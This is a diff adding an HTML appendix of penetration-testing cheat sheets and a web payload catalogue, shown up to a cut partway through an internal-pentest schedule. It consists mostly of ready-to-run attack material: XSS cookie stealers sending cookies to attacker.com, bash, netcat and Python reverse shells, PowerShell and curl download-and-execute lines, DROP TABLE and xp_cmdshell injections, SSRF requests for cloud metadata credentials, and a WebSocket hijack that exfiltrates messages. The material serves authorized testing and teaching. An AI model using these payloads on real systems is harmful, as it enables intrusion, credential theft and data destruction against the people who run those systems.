@@ -1,0 +1,1498 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Appendix — Master Reference &amp; Cheat Sheets</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="breadcrumb">
+<a href="../index.html">🏠 Home</a> &rsaquo; <strong>Appendix — Master Reference &amp; Cheat Sheets</strong>
+</nav>
+
+<header class="part-header">
+<h1>📖 APPENDIX — MASTER REFERENCE &amp; CHEAT SHEETS</h1>
+<p class="subtitle">Massive reference material — the "go-to" appendix you keep open during engagements.</p>
+<div class="chapters">
+<a href="#ap1"><span class="ch-num">A1</span> 1-Page Command Cheat Sheets</a>
+<a href="#ap2"><span class="ch-num">A2</span> Web Pentest Payload Catalogue</a>
+<a href="#ap3"><span class="ch-num">A3</span> Network Pentest Workflows</a>
+<a href="#ap4"><span class="ch-num">A4</span> AWS/Azure/GCP Misconfig Catalog</a>
+<a href="#ap5"><span class="ch-num">A5</span> Active Directory Attack Playbook</a>
+<a href="#ap6"><span class="ch-num">A6</span> Mobile Pentest Checklist</a>
+<a href="#ap7"><span class="ch-num">A7</span> Bug Bounty Methodology</a>
+<a href="#ap8"><span class="ch-num">A8</span> Pentest Tool Inventory</a>
+<a href="#ap9"><span class="ch-num">A9</span> Engagement Troubleshooting Matrix</a>
+<a href="#ap10"><span class="ch-num">A10</span> Quick CVSS Calculator</a>
+<a href="#ap11"><span class="ch-num">A11</span> Glossary</a>
+<a href="#ap12"><span class="ch-num">A12</span> Reading List &amp; Resources</a>
+</div>
+</header>
+
+<main>
+
+<h1>📚 How to Use This Appendix</h1>
+<p>Bookmark this file. Keep it open in a browser tab during every engagement.
+This is your <strong>during-engagement playbook</strong> — never start testing
+without it nearby.</p>
+
+
+<!-- ============ A1 — CHEAT SHEETS ============ -->
+<h1 id="ap1">⌨️ A1 — One-Page Command Cheat Sheets</h1>
+
+<h2>A1.1 Nmap — Your Fingerprint Tool</h2>
+<pre><code class="cmd"># ── Discovery ──
+nmap -sn 10.0.0.0/24                  # Ping sweep (no port scan)
+nmap -Pn -PS80,443 10.0.0.0/24       # Skip ping, TCP SYN probe
+nmap -sn -PR 192.168.1.0/24          # ARP scan (LAN — most reliable)
+
+# ── Port scanning ──
+nmap -sS target                      # SYN scan (stealth)
+nmap -sT target                      # TCP connect (visible)
+nmap -sU -p 53,161,123 target        # UDP scan
+nmap -sV target                      # Version detection
+nmap -sC target                      # Default scripts
+nmap -sA target                      # ACK scan (firewall mapping)
+nmap -sF target                      # FIN scan (bypass stateless FW)
+nmap -sX target                      # Xmas scan (FIN+PSH+URG)
+nmap -sN target                      # NULL scan (no flags)
+
+# ── Aggressive / all-encompassing ──
+nmap -A -p- target                   # Almost everything
+nmap -A -p- -T4 target               # + faster timing
+nmap -T0 target                      # Slow (IDS evasion)
+
+# ── Output formats ──
+nmap -oN scan.txt target             # Normal
+nmap -oX scan.xml target             # XML (for tools)
+nmap -oG scan.grep target            # Greppable
+nmap -oA scan target                 # All formats at once
+
+# ── Specific services ──
+nmap -p22 --script=ssh-brute --script-args userdb=u.txt,passdb=p.txt target
+nmap -p445 --script=smb-vuln-ms17-010 target
+nmap -p80,443 --script=http-enum,http-title,http-methods,http-robots.txt target
+nmap -p21 --script=ftp-anon,ftp-bounce target
+nmap -p53 --script=dns-zone-transfer,dns-brute target
+nmap -p161 --script=snmp-brute,SNMP-info target
+nmap -p3389 --script=rdp-enum-encryption,rdp-vuln-ms12-020 target
+nmap -p5985 --script=http-methods target
+
+# ── Web application fingerprinting ──
+nmap -sV -p80,443 --script=http-title,http-headers,http-server-header,http-enum target
+
+# ── Scan while avoiding IDS ──
+nmap -sS --randomize-hosts -T2 --scan-delay 1s target
+nmap -D RND:10 target                # Decoy scan
+
+# ── Specific ports scan ──
+nmap -p1-1024 target                 # Privileged ports
+nmap -p- target                      # All 65535 ports (slow)
+nmap --top-ports 100 target          # Top 100 ports
+
+# ── Skip discovery on subnet ──
+nmap -Pn -sn 192.168.0.0/16
+
+# ── Useful timing ──
+nmap -T0  # Paranoid
+nmap -T1  # Sneaky
+nmap -T2  # Polite
+nmap -T3  # Normal (default)
+nmap -T4  # Aggressive
+nmap -T5  # Insane
+</code></pre>
+
+<h2>A1.2 Burp Suite Quick Reference</h2>
+<table>
+<tr><th>Action</th><th>How</th></tr>
+<tr><th colspan="2" style="background:#0a3d62;color:#fff">Proxy</th></tr>
+<tr><td>Start Burp on web</td><td>FoxyProxy → 127.0.0.1:8080</td></tr>
+<tr><td>Install Burp CA in browser</td><td>http://burp → "CA Certificate"</td></tr>
+<tr><td>Intercept ON/OFF</td><td>Proxy → Intercept tab → button</td></tr>
+<tr><td>Send request to Repeater</td><td>Right-click request → "Send to Repeater"</td></tr>
+<tr><td>Send to Intruder for fuzzing</td><td>Right-click → "Send to Intruder"</td></tr>
+<tr><th colspan="2" style="background:#0a3d62;color:#fff">Repeater</th></tr>
+<tr><td>Send modified request</td><td>Click "Send"</td></tr>
+<tr><td>Compare two requests</td><td>Open in new Repeater tab</td></tr>
+<tr><td>Hotkeys</td><td>Ctrl+R = send; Ctrl+I = send + intercept</td></tr>
+<tr><th colspan="2" style="background:#0a3d62;color:#fff">Intruder</th></tr>
+<tr><td>Define attack positions</td><td>Click "Clear §" then highlight target §…§</td></tr>
+<tr><td>Choose attack type</td><td>Sniper / Battering ram / Pitchfork / Cluster bomb</td></tr>
+<tr><td>Add wordlist</td><td>Payloads → load from file</td></tr>
+<tr><td>Run attack</td><td>Click "Start attack"</td></tr>
+<tr><td>Match/grep results</td><td>Filter by status, length, regex</td></tr>
+<tr><th colspan="2" style="background:#0a3d62;color:#fff">Decoder</th></tr>
+<tr><td>Decode base64</td><td>Paste → click "Decode as Base64"</td></tr>
+<tr><td>Encode for XSS</td><td>Encode as HTML entities, URL encode, etc.</td></tr>
+<tr><th colspan="2" style="background:#0a3d62;color:#fff">Extensions</th></tr>
+<tr><td>Install BApp</td><td>Extender → BApp Store → install</td></tr>
+<tr><td>Logger++</td><td>Search/filter full HTTP history</td></tr>
+<tr><td>Autorize</td><td>Auto-detect broken access control</td></tr>
+<tr><td>Param Miner</td><td>Discover hidden parameters</td></tr>
+<tr><td>JWT Editor</td><td>Craft &amp; sign JWTs</td></tr>
+<tr><td>Collaborator Everywhere</td><td>Detect blind SSRF/XXE</td></tr>
+</table>
+
+<h2>A1.3 SQLMap — Database Exploitation</h2>
+<pre><code class="cmd"># Basic
+sqlmap -u "http://target/item?id=1" --dbs
+sqlmap -u "http://target/item?id=1" -D dbname --tables
+sqlmap -u "http://target/item?id=1" -D dbname -T users --dump
+sqlmap -u "http://target/item?id=1" -D dbname -T users -C username,password --dump
+
+# From request file
+sqlmap -r request.txt --dbs
+
+# POST request
+sqlmap -u "http://target/login.php" --data="username=admin&amp;password=test" --dbs
+
+# Authenticated
+sqlmap -u "http://target/item?id=1" --cookie="session=abc123" --dbs
+
+# Aggressive
+sqlmap -r request.txt --batch --risk=3 --level=5
+
+# OS-shell
+sqlmap -r request.txt --os-shell
+
+# With TOR
+sqlmap -u "..." --tor --tor-type=SOCKS5 --check-tor
+
+# Specific DBMS
+sqlmap -u "..." --dbms=mysql --dbs
+
+# WAF bypass
+sqlmap -u "..." --tamper=between,space2comment,uppercase
+sqlmap --list-tampers
+
+# Threads
+sqlmap -u "..." --threads=10
+
+# Output
+sqlmap -u "..." --output-dir=/tmp/sqlmap_out
+</code></pre>
+
+<h2>A1.4 Hydra — Online Brute Force</h2>
+<pre><code class="cmd"># SSH
+hydra -L users.txt -P pass.txt target ssh -t 4 -vV
+
+# HTTP POST form
+hydra target http-post-form "/login:username=^USER^&amp;password=^PASS^:Invalid" -L u.txt -P p.txt
+
+# MySQL
+hydra -L u.txt -P p.txt target mysql
+
+# RDP
+hydra -L u.txt -P p.txt target rdp
+
+# FTP
+hydra -L u.txt -P p.txt target ftp
+
+# SMB
+hydra -L u.txt -P p.txt target smb
+
+# HTTP Basic Auth
+hydra -L u.txt -P p.txt target http-get /protected/
+
+# HTTPS
+hydra -L u.txt -P p.txt target https-post-form "/login:..."
+
+# Restartable (resume after crash)
+hydra ... -R
+
+# Check valid creds
+hydra -L u.txt -p "CompanyName2024" target rdp -t 1
+</code></pre>
+
+<h2>A1.5 John the Ripper &amp; Hashcat</h2>
+<pre><code class="cmd"># John
+john --wordlist=rockyou.txt hash.txt         # Basic
+john --format=bcrypt hash.txt                # Specific format
+john --show hash.txt                         # Show cracked
+john --restore                               # Resume
+john --status                                # Status
+
+# Hashcat (faster, GPU)
+# Mode 0 = MD5, 100 = SHA1, 1000 = NTLM, 1800 = sha512crypt,
+# 3200 = bcrypt, 13100 = Kerberoast, 18200 = ASREP, 22000 = WPA
+
+hashcat -m 0 hash.txt rockyou.txt           # MD5
+hashcat -m 1000 hash.txt rockyou.txt        # NTLM (Windows hashes)
+hashcat -m 3200 hash.txt rockyou.txt        # bcrypt
+hashcat -m 13100 kerb.txt rockyou.txt       # Kerberoast
+hashcat -m 18200 asrep.txt rockyou.txt      # AS-REP Roast
+hashcat -m 22000 wpa.hc22000 rockyou.txt    # WPA
+
+# Show cracked
+hashcat -m 0 hash.txt --show
+
+# Apply mask (e.g. lowercase alpha 8 chars)
+hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l
+</code></pre>
+
+<h2>A1.6 Linux Privilege Escalation Cheat</h2>
+<pre><code class="cmd"># System enumeration
+uname -a
+cat /etc/os-release
+cat /etc/issue
+
+# Users
+id
+cat /etc/passwd   # Find users with /bin/bash shell
+cat /etc/shadow   # Need root
+last | head       # Recent logins
+
+# SUID/SGID binaries
+find / -perm -u=s -type f 2&gt;/dev/null
+find / -perm -g=s -type f 2&gt;/dev/null
+
+# Sudo permissions
+sudo -l
+
+# Cron jobs
+ls -la /etc/cron*
+cat /etc/crontab
+crontab -l
+
+# Path
+echo $PATH
+
+# World writable files &amp; dirs
+find / -writable -type d 2&gt;/dev/null
+find / -writable -type f 2&gt;/dev/null
+
+# Capabilities
+getcap -r / 2&gt;/dev/null
+
+# Network connections
+netstat -antup
+ss -tlpn
+
+# Check processes
+ps aux | grep -i 'root'
+ps -ef | grep -v '\[.*\]' | grep -v 'ps -ef' | grep -v 'grep'
+
+# Find installed software
+dpkg -l       # Debian
+rpm -qa        # RHEL
+
+# Kernel exploits
+uname -r
+searchsploit linux kernel &lt;version&gt;
+
+# Architecture &amp; libc (for exploit selection)
+file /bin/bash
+checksec --file=/bin/bash
+
+# Writable files owned by root
+find / -user root -writable -type f 2&gt;/dev/null
+
+# Check for docker socket
+ls -la /var/run/docker.sock
+
+# Get passwords from config files
+find / -name "*.conf" 2&gt;/dev/null | xargs grep -l "password" 2&gt;/dev/null
+find / -name "*.config" 2&gt;/dev/null | xargs grep -l "password" 2&gt;/dev/null
+
+# Last resort: download linpeas
+curl http://10.10.10.5/linpeas.sh | bash
+</code></pre>
+
+<h2>A1.7 Windows Privilege Escalation Cheat</h2>
+<pre><code class="cmd"># System info
+systeminfo | findstr /B /C:"OS" /C:"System Type"
+hostname
+whoami /all
+whoami /priv
+
+# Users &amp; groups
+net users
+net localgroup administrators
+net group "Domain Admins" /domain
+
+# Network
+netstat -ano
+ipconfig /all
+route print
+arp -a
+net view
+net session
+net use
+
+# Processes &amp; Services
+tasklist /svc
+tasklist /v
+wmic service list brief
+sc query
+
+# Scheduled tasks
+schtasks /query /fo LIST /v
+
+# Auto-startup
+wmic startup list full
+Get-CimInstance Win32_StartupCommand | Select Name, Command, Location, User
+
+# Registry
+reg query HKLM /f "password" /t REG_SZ /s
+reg query HKCU /f "password" /t REG_SZ /s
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\SYSTEM\CurrentControlSet\Services
+
+# Installed Software
+wmic product list brief | findstr /i "name version"
+
+# Files &amp; shares
+dir /s C:\Users\
+net share
+net view \\COMPUTERNAME
+
+# Firewalls
+netsh advfirewall show allprofiles
+netsh firewall show state
+
+# AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# Unattend/sysprep files (passwords!)
+dir C:\Windows\Panther\ /s
+dir C:\Windows\system32\Sysprep\ /s
+findstr /S /I /C:"password" C:\Windows\system32\*.ini
+
+# Backup files
+dir /s /b C:\*.bak C:\*.old C:\*.tmp
+
+# PowerShell history
+type %APPDATA%\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+# WinPEAS
+upload winPEASx64.exe
+./winPEASx64.exe
+
+# PrintSpoofer (SeImpersonate)
+./PrintSpoofer64.exe -i -c cmd
+</code></pre>
+
+<h2>A1.8 Wireshark Display Filters</h2>
+<pre><code class="cmd"># Basic
+ip.addr == 10.10.10.5             # specific IP
+ip.src == 10.10.10.5              # source only
+ip.dst == 10.10.10.5              # destination only
+
+# TCP
+tcp.port == 80                    # specific port
+tcp.flags.syn == 1                # SYN packets
+tcp.flags.reset == 1              # RST packets
+tcp.seq                          # TCP sequence
+
+# HTTP
+http.request.method == POST       # POST requests
+http.request.uri == "/admin"      # specific URL
+http.response.code == 401         # unauthorized responses
+http.cookie == "session=abc"      # specific cookie
+
+# DNS
+dns.qry.name contains "target"
+dns.flags.response == 1
+
+# TLS/SSL
+tls.handshake.extensions_server_name == "target.com"
+
+# WebSocket
+websocket.payloadlen &gt; 0          # Active WebSocket frames
+
+# Authentication
+kerberos                         # Kerberos traffic
+ntlmssp                          # NTLMSSP traffic
+ntlmssp.auth.username            # Capture username
+
+# SMB
+smb                             # SMB
+smb2                            # SMBv2/3
+
+# Modern
+http2                           # HTTP/2 traffic
+quic                           # QUIC / HTTP/3
+
+# Useful combos
+http.request and ip.src == 10.10.10.5
+tcp.flags.syn == 1 and tcp.flags.ack == 0    # SYN only
+</code></pre>
+
+<h2>A1.9 Tmux — Productive Pentester</h2>
+<pre><code class="cmd"># Start session
+$ tmux
+
+# Prefix = Ctrl-b
+
+# Pane: split horizontal       Prefix + "
+# Pane: split vertical         Prefix + %
+# Move between panes           Prefix + arrow
+# Resize pane                  Prefix + Ctrl-arrow
+# Close pane                   Prefix + x (or exit)
+
+# Window: new                  Prefix + c
+# Switch window                Prefix + n (next) / p (previous)
+# Rename window                Prefix + ,
+
+# Session: detach              Prefix + d
+# Reattach                     tmux a -t 0
+# List sessions                tmux ls
+
+# Save state for next engagement
+$ tmux rename-session "pentest-eng-X"
+$ tnux kill-session -t "oldname"
+# or save all panes history
+Prefix + : capture-pane -S -10000 \; save-buffer history.txt
+
+# Powerline / theme
+# Use Oh-my-tmux for pre-config setup.</code></pre>
+
+<h2>A1.10 Git — Pentester Cheat</h2>
+<pre><code class="cmd"># Search git history for secrets
+$ git log -p | grep -E "(password|secret|key|api)" -i
+$ git log --all --full-history -- "*credentials*"
+$ git log --all --full-history --source -- "*.env"
+
+# Find specific commit that added/removed a string
+$ git log -S "AKIA12345" -p
+
+# Diff between any 2 commits
+$ git diff commit1..commit2
+
+# Find binary removal over time
+$ git log --all --diff-filter=D --summary | grep delete
+
+# Checkout to commit
+$ git checkout &lt;commit-hash&gt;
+
+# Practical: when you find old credentials
+# (don't reset — work in branches!)
+</code></pre>
+
+
+<!-- ============ A2 — PAYLOAD CATALOG ============ -->
+<h1 id="ap2">🎯 A2 — Web Pentest Payload Catalogue</h1>
+
+<h2>A2.1 SQL Injection Payloads</h2>
+<pre><code class="cmd"># ── Authentication bypass ──
+admin'--
+admin'-- -
+admin' OR '1'='1'-- -
+admin' OR '1'='1'#
+admin' OR 1=1--
+' OR 1=1--
+" OR 1=1--
+' OR 'a'='a'--
+') OR ('a'='a
+') OR 1=1--
+
+# ── Union-based ──
+' ORDER BY 1--            # Find column count
+' UNION SELECT NULL--      # Test union
+' UNION SELECT NULL,NULL-- # 2 columns
+' UNION SELECT user(),version()--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username,password FROM users--
+
+# ── Stacked queries ──
+'; DROP TABLE users--
+'; EXEC xp_cmdshell('whoami')--
+'; WAITFOR DELAY '0:0:5'--
+
+# ── Blind (time) ──
+' AND SLEEP(5)--                # MySQL
+'; WAITFOR DELAY '0:0:5'--      # MSSQL
+' AND pg_sleep(5)--             # PostgreSQL
+' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--   # Oracle
+
+# ── Blind (boolean) ──
+' AND 1=1--    (page render)
+' AND 1=2--    (page changes)
+' AND (SELECT SUBSTRING(@@version,1,1))='M'--
+
+# ── Out-of-band ──
+'; exec master..xp_dirtree '\\attacker.com\share'--
+
+# ── Second-order SQLi ──
+# Inject into username, then SELECT it in admin panel
+Username: admin'; DROP TABLE logs;--
+</code></pre>
+
+<h2>A2.2 XSS Payloads</h2>
+<pre><code class="cmd"># ── Basic ──
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;a href="javascript:alert(1)"&gt;click
+&lt;iframe src="javascript:alert(1)"&gt;
+&lt;video&gt;&lt;source onerror="alert(1)"&gt;
+&lt;input onfocus=alert(1) autofocus&gt;
+
+# ── Cookie stealer ──
+&lt;script&gt;new Image().src='http://attacker.com/x?c='+document.cookie&lt;/script&gt;
+&lt;script&gt;fetch(`http://attacker.com/x?`+document.cookie)&lt;/script&gt;
+&lt;script&gt;document.location='http://attacker.com/x?c='+document.cookie&lt;/script&gt;
+&lt;script&gt;navigator.sendBeacon('http://attacker.com/x', document.cookie)&lt;/script&gt;
+
+# ── Bypass attempts ──
+&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;
+&lt;img ""&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;a/href="javascript:alert(1)"&gt;x
+&lt;svg/onload=alert(1)&gt;
+&lt;scRipt&gt;alert(1)&lt;/scRipt&gt;
+%3Cscript%3Ealert(1)%3C/script%3E
+&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1)"&gt;
+
+# ── With diacritics ──
+&lt;script&gt;/*--&gt;&lt;/script&gt;
+&lt;svg&gt;&lt;animate xlink:href="#x" attributeName="href" values="javascript:alert(1)"/&gt;
+&lt;/svg&gt;&lt;a id="x"&gt;&lt;rect width="100%" height="100%" fill="white"/&gt;&lt;/a&gt;
+
+# ── DOM-based ──
+https://target.com/#&lt;script&gt;alert(1)&lt;/script&gt;
+javascript:alert(document.domain)
+eval(location.hash.substring(1))
+
+# ── Modern ──
+&lt;script&gt;fetch('/api/user').then(r=&gt;r.json()).then(j=&gt;fetch('http://atk',{method:'POST',body:JSON.stringify(j)}))&lt;/script&gt;
+</code></pre>
+
+<h2>A2.3 Command Injection Payloads</h2>
+<pre><code class="cmd">; whoami                           # semicolon chain
+| whoami                           # pipe
+|| whoami                          # OR (only if first fails)
+&amp;&amp; whoami                          # AND (only if first succeeds)
+`whoami`                           # backtick
+$(whoami)                          # subshell
+\0123                              # newline bypass
+
+# Multiple commands
+; id; uname -a; hostname
+| cat /etc/passwd
+&amp;&amp; echo "x" || echo "y"
+
+# Reverse shell
+; bash -i >&amp; /dev/tcp/10.10.10.5/4444 0>&amp;1
+; nc 10.10.10.5 4444 -e /bin/bash
+; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# Filter bypass
+%0awhoami                          # URL-encoded newline
+%0acat+/etc/passwd                 # URL-encoded
+
+# Windows
+| whoami
+&amp; ipconfig
+&amp;&amp; whoami
+%26 net user                       # &amp; encoded
+
+# PowerShell
+; powershell -c "Get-Process"
+; powershell -nop -c "iex(iwr http://atk/payload.ps1)"
+</code></pre>
+
+<h2>A2.4 Path Traversal Payloads</h2>
+<pre><code class="cmd"># Linux
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../../etc/shadow
+/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+..%252f..%252f..%252fetc/passwd  (double encode)
+....//....//....//etc/passwd
+..\..\..\etc\passwd             # Windows-style
+..%5c..%5c..%5c..%5cboot.ini
+..%00/etc/passwd                # null byte
+..%252f..%252f..%252f..%252fetc/passwd (IIS + URL)
+
+# Absolute
+file:///etc/passwd
+/etc/passwd
+%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd   # UTF-8 bypass
+
+# Windows
+..\..\..\..\windows\win.ini
+..\..\..\..\boot.ini
+C:\Windows\win.ini
+\\?\C:\Windows\win.ini
+</code></pre>
+
+<h2>A2.5 SSTI (Server-Side Template Injection)</h2>
+<pre><code class="cmd"># Confirm SSTI
+{{7*7}}            # Jinja2: 49
+&lt;%= 7*7 %&gt;        # ERB:    49
+${7*7}             # Smarty, FreeMarker: 49
+#{7*7}             # Rails ERB: 49
+{{7*'7'}}          # Jinja2 string: 7777777
+&lt;#assign x="7*7"&gt;${x}  # FreeMarker: 49
+${{7*7}}          # Spring Expression: 49
+
+# Polyglot
+${{&lt;%[%'"}}%\.
+
+# Read files (Jinja2)
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+# Find subclasses that can read files...
+{{ ''.__class__.__mro__[1].__subclasses__()|attr('__getitem__')(40)('/etc/passwd').read() }}
+
+# Or use request object:
+{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
+
+# Twig (PHP)
+{{ ['id']|map('system')|join }}
+
+# Smarty
+{system('id')}
+</code></pre>
+
+<h2>A2.6 NoSQL Injection Payloads</h2>
+<pre><code class="cmd"># MongoDB (as JSON)
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": "admin", "password": {"$ne": null}}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+
+# URL parameter form
+username[$gt]=&amp;password[$gt]=
+username=admin&amp;password[$ne]=1
+username[$regex]=.*&amp;password[$regex]=.*
+
+# MongoDB JavaScript injection (older versions)
+{"username": {"$where": "this.username.match(/.*/)"}}
+
+# Auth bypass
+{"username": "admin", "password": {"$gt": ""}}
+# Returns the first user if exists
+
+# Extraction
+{"username": {"$regex": "^a"}, "password": {"$gt": ""}}
+# ^a returns only users starting with 'a'
+</code></pre>
+
+<h2>A2.7 XXE (XML External Entity)</h2>
+<pre><code class="cmd">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ELEMENT foo ANY&gt;
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+
+# SSRF via XXE
+&lt;!ENTITY xxe SYSTEM "http://internal.target.com:8080/admin"&gt;
+
+# Out-of-band
+&lt;!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"&gt;
+&lt;!ENTITY % intern "&amp;%remote;"&gt;
+%intern;
+%trick;
+
+# PHP specific
+&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt;
+
+# Java specific
+&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+
+# Modern defense: disable DTD processing
+# DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+# dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+</code></pre>
+
+<h2>A2.8 SSRF Payloads</h2>
+<pre><code class="cmd"># Target the AWS metadata service
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/meta-data/hostname
+
+# GCP metadata
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+# Header: Metadata-Flavor: Google
+
+# Azure metadata
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+# Header: Metadata: true
+
+# DigitalOcean
+http://169.254.169.254/metadata/v1/
+
+# Bypass IP filter
+http://localhost.target.com
+http://127.1
+http://0x7f000001
+http://2130706433      # decimal IP
+http://017700000001    # octal IP
+http://[::1]           # IPv6 localhost
+http://attacker.com/redirector?to=http://169.254.169.254
+http://target.com@127.0.0.1   # @ confusion
+http://127.0.0.1%00.target.com
+http://localtest.me     # resolves to 127.0.0.1
+http://customer1.app.localhost.my.company.127.0.0.1.nip.io
+http://127.0.0.1.nip.io
+
+# Internal port scan
+GET /api/proxy?url=http://internal-svc:8080/admin
+GET /api/proxy?url=http://127.0.0.1:9200/_cat/indices
+
+# Protocol smuggling
+gopher://internal-svc:6379/_FLUSHALL
+</code></pre>
+
+<h2>A2.9 LDAP Injection Payloads</h2>
+<pre><code class="cmd"># Anonymous binding
+*
+admin)(&amp;
+admin)(|(password=*
+
+# Bypass auth
+user=*
+*))(uid=*
+)(uid=*))
+
+# Escape characters
+admin\)(&amp;(password=*
+</code></pre>
+
+<h2>A2.10 Header Injection / CRLF</h2>
+<pre><code class="cmd"># URL with %0d%0a (CRLF)
+?q=value%0d%0aContent-Type:%20text/html%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;
+
+# Or use raw carriage return + line feed in cookie
+Cookie: session=abc\r\nLocation: http://evil.com
+</code></pre>
+
+<h2>A2.11 XPath Injection</h2>
+<pre><code class="cmd">' or '1'='1
+1' or '1'='1
+" or "1"="1
+') or ('1'='1
+</code></pre>
+
+<h2>A2.12 WebSocket Hijacking</h2>
+<pre><code class="cmd"># Identify WS
+# Burp Suite → Request looks like: Upgrade: websocket, Connection: Upgrade
+
+# Hijack — CSWSH (Cross-Site WebSocket Hijacking)
+# No Origin check? Connect from evil page!
+
+&lt;script&gt;
+var ws = new WebSocket("wss://target.com/chat");
+ws.onmessage = function(e) { fetch("http://attacker.com/x?d=" + e.data); };
+&lt;/script&gt;
+</code></pre>
+
+<h2>A2.13 JWT Attack Payloads</h2>
+<pre><code class="cmd"># alg: none
+# Original: eyJhbGciOiJIUzI1NiIs...
+# Modified: eyJhbGciOiJub25lIiw...  (alg=none in base64)
+# Then: header.payload. (empty signature)
+
+# Algorithm confusion
+# Server uses RS256, you provide HS256 with the public key
+
+# Key in jku header
+# Original: { "alg":"RS256", "jku":"https://target.com/jwks.json" }
+# Modified: { "alg":"RS256", "jku":"https://attacker.com/jwks.json" }
+
+# Key in kid (SQL injection)
+{ "alg":"HS256", "kid":"' || 'secret' --" }
+
+# kid as path
+{ "alg":"HS256", "kid":"../../dev/null" }
+
+# Tools
+$ jwt_tool &lt;token&gt; -T
+$ jwt_tool &lt;token&gt; -C -d rockyou.txt -k
+$ python3 jwt_tool.py &lt;token&gt; -X a   # alg=none
+$ python3 jwt_tool.py &lt;token&gt; -X k   # key confusion</code></pre>
+
+
+<!-- ============ A3 — NETWORK PENTEST ============ -->
+<h1 id="ap3">🛜 A3 — Network Pentest Step-by-Step</h1>
+
+<h2>A3.1 External Pentest — 7 Day Recipe</h2>
+
+<h3>Day 1 — Recon + Scope</h3>
+<pre><code class="cmd"># Goal: understand the target's external footprint
+
+# WHOIS
+$ whois target.com
+$ whois -h whois.radb.net '!gAS32934'     # if you know ASN
+
+# DNS enumeration
+$ dig axfr @ns1.target.com target.com
+$ dnsrecon -d target.com -a
+$ subfinder -d target.com -silent | sort -u
+
+# Live hosts
+$ cat subs.txt | httpx -status-code -silent -o live.txt
+
+# Port scan externally
+$ nmap -iL live.txt -p- -sV -T4 -oA external_full
+
+# Identify service versions
+$ nmap --script=banner,vuln -iL live.txt
+
+# Cloud footprints
+$ curl http://target.s3.amazonaws.com
+$ curl https://target.azurewebsites.net
+$ curl https://target.com (look for *.cloudfront.net, *.azureedge.net in HTML)
+</code></pre>
+
+<h3>Day 2 — Web App Pentest</h3>
+<ul class="checklist">
+  <li>Hunt for hidden endpoints (gobuster, ffuf)</li>
+  <li>Test authentication (rate limit, user enum, brute)</li>
+  <li>Test session cookies</li>
+  <li>OWASP Top 10 testing</li>
+  <li>Business logic flaws</li>
+</ul>
+
+<h3>Day 3-4 — Exploitation</h3>
+<ul class="checklist">
+  <li>Privilege escalation if foothold gained</li>
+  <li>Cross-account pivots</li>
+  <li>Data exfiltration PoC</li>
+  <li>Chained attacks (SSRF + IAM, etc.)</li>
+</ul>
+
+<h3>Day 5-6 — Reporting</h3>
+<ul class="checklist">
+  <li>Comprehensive report writing</li>
+  <li>Executive summary</li>
+  <li>Risk-matrix heatmap</li>
+  <li>Remediation roadmap</li>
+</ul>
+
+<h3>Day 7 — Re-test (if applicable)</h3>
+
+<h2>A3.2 Internal Pentest — 12 Day Recipe</h2>
+
+<h3>Day 1-2 — Initial Access</h3>
+<ul class="checklist">
+  <li>VPN/port-forward connected</li>
+  <li>Starting credentials (test user)</li>
+  <li>Discovery scan: netdiscover / nmap -sn</li>
+  <li>Initial enumeration</li>
+</ul>
+
+<h3>Day 3-5 — Enumeration</h3>
+<ul class="checklist">
+  <li>Domain enumeration (BloodHound data collection)</li>
+  <li>User listing (LDAP, SMB)</li>
+  <li>Share enumeration</li>
+  <li>Service enumeration</li>
+</ul>
+
+<h3>Day 6-8 — Attack</h3>
+<ul class="checklist">
+  <li>AD attacks (LLMNR, Kerberoast, AS-REProast)</li>
+  <li>Local privilege escalation</li>
+  <li>Lateral movement</li>
+  <li>Domain dominance</li>
+</ul>
+
+<h3>Day 9-10 — Cloud Hybrid</h3>
+<ul class="checklist">
+  <li>AWS/Azure integration with AD</li>
+  <li>Pivots to cloud</li>
+  <li>SaaS abuse (M365, Dynamics)</li>
